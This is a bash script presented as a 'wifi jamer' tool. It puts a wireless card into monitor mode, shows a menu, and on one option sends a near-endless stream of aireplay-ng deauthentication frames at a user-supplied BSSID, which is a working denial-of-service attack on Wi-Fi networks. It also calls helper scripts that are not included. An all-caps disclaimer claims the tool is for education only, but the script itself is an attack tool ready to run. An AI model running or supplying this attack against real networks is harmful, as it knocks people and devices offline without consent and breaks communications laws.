#!/bin/bash
sudo airmon-ng start wlan0
clear
    figlet                   wifi jamer 
echo " This script create by harsh tagra for more https://github.com/Harsh-Tagra/ "
echo 

echo  " $(tput setaf 1)DISCLAMER!THIS TOOL D0ES NOT PROMOTE OR ENCOURAGE ANY ILLEGAL ACTIVES ALL TOOL ARE PROVIDED BY ME MEEAT TO EDUCATION PURPOSE ONLY $(tput sgr 0)"
echo
echo "1.If you not have bssid or chenal number "
echo "2.If you have  chenal number but dont know bssid  "
echo "3.Wifi jam dos attack (if you know bssid or chenal number) "
echo "4.To wifi enable again"
echo
read -p "Enter option number: " option
if [ "$option" = "1" ];
then 

 
  sudo gnome-terminal -x src/./abc.sh  
    

elif [ "$option" = "2" ];
then 
  read -p "enter chenal num: " chenalnum
      sudo gnome-terminal -x src/./bc.sh $chenalnum
    
elif [ "$option" = "3" ];
then 

  read -p "Enter bssid : " bssid 
    read -p "Enter chenal number : " chenalnum

   
  sudo gnome-terminal -x src/./rw.sh $bssid $chenalnum
   sudo aireplay-ng --deauth 9999999 -a  $bssid  wlan0mon 

 elif [ "$option" = "4" ];
then 
 sudo gnome-terminal -x src/./fix.sh 
else 
 echo "Not coorect option please enter valid option"


 fi